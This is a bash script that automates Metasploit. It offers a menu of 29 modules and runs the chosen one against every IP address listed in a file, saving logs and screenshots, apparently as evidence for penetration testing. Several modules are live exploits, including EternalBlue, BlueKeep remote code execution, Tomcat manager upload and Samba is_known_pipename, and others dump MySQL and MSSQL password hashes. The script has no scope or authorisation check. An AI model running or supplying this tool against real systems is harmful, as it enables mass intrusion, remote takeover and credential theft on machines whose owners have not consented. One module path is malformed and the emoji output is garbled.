#!/bin/bash

# Check if Metasploit Framework is installed
command -v msfconsole >/dev/null 2>&1 || { echo >&2 "Metasploit Framework is required but not installed. Aborting."; exit 1; }

# Check if scrot is available and GUI exists
if command -v scrot >/dev/null 2>&1 && [ ! -z "$DISPLAY" ]; then
    ENABLE_SCREENSHOT=true
else
    echo "‚ö†Ô∏è scrot not available or no GUI detected, screenshots will be skipped."
    ENABLE_SCREENSHOT=false
fi

# Check if gnome-terminal is available (used only for screenshots)
if $ENABLE_SCREENSHOT && ! command -v gnome-terminal >/dev/null 2>&1; then
    echo "‚ö†Ô∏è gnome-terminal not found. Disabling screenshots."
    ENABLE_SCREENSHOT=false
fi

# Exploit modules
declare -A modules
modules[1]="auxiliary/scanner/ftp/anonymous"
modules[2]="auxiliary/scanner/rdp/cve_2019_0708_bluekeep"
modules[3]="auxiliary/scanner/ssl/openssl_heartbleed"
modules[4]="auxiliary/scanner/smb/smb_ms17_010"
modules[5]="exploit/multi/http/simple_backdoors_exec"
modules[6]="auxiliary/scanner/mysql/mysql_authbypass_hashdump"
modules[7]="auxiliary/scanner/msmq/cve_2023_21554_queuejumper"
modules[8]="auxiliary/scanner/smtp/smtp_relay"
modules[9]="exploit/windows/rdp/rdp_bluekeep_rce"
modules[10]="exploit/windows/smb/ms17_010_eternalblue"
modules[11]="scanner/mssql/mssql_hashdump"
modules[12]="auxiliary/scanner/redis/redis_server"
modules[13]="exploit/multi/http/tomcat_mgr_upload"
modules[14]="exploit/windows/http/iis_webdav_scstoragepathfromurl"
modules[15]="auxiliary/scanner/ssh/ssh_version"
modules[16]="auxiliary/scanner/http/http_version"
modules[17]="exploit/multi/http/jetty_win_shell"
modules[18]="exploit/multi/misc/activemq_jmx_bypass"
modules[19]="exploit/multi/http/jboss_maindeployer"
modules[20]="exploit/multi/http/php_cgi_arg_injection"
modules[21]="auxiliary/scanner/http/http_header"
modules[22]="exploit/multi/http/subversion_date"
modules[23]="exploit/linux/samba/is_known_pipename"
modules[24]="auxiliary/scanner/dns/dns_amp"
modules[25]="auxiliary/scanner/ldap/ldap_search"
modules[26]="auxiliary/scanner/kerberos/kerberos_ping"
modules[27]="auxiliary/scanner/dcerpc/endpoint_mapper"
modules[28]="auxiliary/scanner/http/http_methods"
modules[29]="auxiliary/scanner/http/title"

# Display menu
echo "Select the exploit module to run:"
for i in $(seq 1 ${#modules[@]}); do
    echo "  $i) ${modules[$i]}"
done

read -p "Enter your choice [1-${#modules[@]}]: " choice
selected_module=${modules[$choice]}

if [ -z "$selected_module" ]; then
    echo "‚ùå Invalid choice. Exiting."
    exit 1
fi

# Folder setup
module_folder=$(echo "$selected_module" | tr '/' '_')
mkdir -p "$module_folder/logs"
[ "$ENABLE_SCREENSHOT" = true ] && mkdir -p "$module_folder/screenshots"

# Loop through IPs
while IFS= read -r ip; do
    echo "üöÄ Running module $selected_module on $ip"

    rcfile="msf_script_$ip.rc"
    raw_logfile="$module_folder/logs/${ip}_raw.log"
    clean_logfile="$module_folder/logs/${ip}.log"
    screenshot="$module_folder/screenshots/${ip}.png"

    # Build RC script
    cat <<EOF > "$rcfile"
use $selected_module
set VERBOSE true
set RHOSTS $ip
options
run
exit
EOF

    # Run Metasploit
    msfconsole -q -r "$rcfile" > "$raw_logfile" 2>&1

    # Strip ANSI codes from log
    sed -r "s/\x1B\[[0-9;]*[mK]//g" "$raw_logfile" > "$clean_logfile"
    rm -f "$raw_logfile"

    # Take screenshot if GUI is enabled
    if [ "$ENABLE_SCREENSHOT" = true ]; then
        gnome-terminal -- bash -c "cat $clean_logfile; exec bash" &
        sleep 3
        scrot -u -q 100 "$screenshot"
        pkill gnome-terminal
    fi

    # Cleanup
    rm -f "$rcfile"

    echo "‚úÖ Completed $ip"
    echo "üìù Log saved: $clean_logfile"
    [ "$ENABLE_SCREENSHOT" = true ] && echo "üì∏ Screenshot saved: $screenshot"
    echo "-----------------------------------------"
    sleep 3

done < ip_addresses.txt
